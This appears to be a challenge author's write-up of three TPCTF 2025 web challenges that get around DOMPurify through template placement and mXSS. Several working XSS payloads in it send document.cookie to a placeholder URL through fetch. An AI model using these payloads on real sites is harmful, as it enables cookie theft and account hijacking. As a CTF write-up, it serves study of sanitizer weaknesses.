https://ouuan.moe/post/2025/03/tpctf-2025

## baby layout (81 solves)

One solution is to put `{{content}}` inside an attribute and to close the quote in the inner payload:

```html
<img src="{{content}}">
```

```html
" onerror="fetch('{YOUR_URL}'+document.cookie)
```

An alternative solution is to close a `<textarea>`, like [Bad usage | Not enough context | Exploring the DOMPurify library: Hunting for Misconfigurations (2/2) | mizu.re](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#bad-usage-not-enough-context):

```html
<textarea>{{content}}</textarea>
```

```html
<div id="</textarea><img src=x onerror=fetch('{YOUR_URL}'+document.cookie)>"></div>
```

## safe layout (50 solves)

I made a mistake not banning `data` and `aria` attributes (`ALLOW_DATA_ATTR` and `ALLOW_ARIA_ATTR`)[^mizu-2], so it can be solved in the same way as the baby version by using `data-x` or `aria-x` instead of other attributes like `src`.

[^mizu-2]: I created this challenge before [this blog post](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations) was published. I did notice it before the event, but apparently I did not read it very carefully :(

## safe layout revenge (29 solves)

Tips: You can use [Dom-Explorer](https://yeswehack.github.io/Dom-Explorer/) to see DOMPurify output. It’s a great tool for playing with mXSS and sanitizers.

We need to get a malicious tag without using attributes. Normally, malicious tags will be either removed or escaped, but we can get unescaped angle brackets in `<style>`. DOMPurify is very strict and any HTML tags in `<style>` will be filtered. However, the regular expression only checks for `/<[/\w]/`, so `<{{content}}` will not be filtered and can be used to get malicious tags.

Here the inner payload is used twice, first to close the `<style>` tag and then to create the `<img>` tag:

```html
a<style>{{content}}<{{content}}</style>
```

```html
img src onerror=fetch(`{YOUR_URL}/`+document.cookie) <style></style>
```

Another solution is similar but uses an empty `{{content}}`, like [CVE-2023-48219](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce)[^mizu-2].
